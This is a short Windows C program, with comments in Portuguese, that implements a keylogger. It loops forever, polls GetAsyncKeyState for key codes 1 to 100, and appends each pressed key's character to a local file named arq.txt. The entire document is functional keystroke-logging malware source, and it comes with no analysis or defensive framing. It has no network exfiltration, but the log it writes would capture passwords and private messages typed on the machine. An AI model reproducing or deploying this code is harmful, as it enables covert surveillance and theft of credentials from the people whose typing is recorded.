#include<windows.h>
#include<stdio.h>

int main(){
	int teclas, resultado; //1º guarga a tecle digitada
	                      //2º guarda o resultado da verificação
	FILE *arq;
	
	arq = fopen("arq.txt", "w");
	fclose(arq);
	
	while(1){
		for(teclas=1; teclas<= 100; teclas++){
			Sleep(1);
			resultado = GetAsyncKeyState(teclas);
			
			if(resultado == -32767){
				arq = fopen("arq.txt", "a"); // fopen() funçao utilizada para abrir o arquivo
				fprintf(arq,"%c", teclas);
				fclose(arq);
				
			}
			
			
		}
	}
	
	                      
	return 0;
}
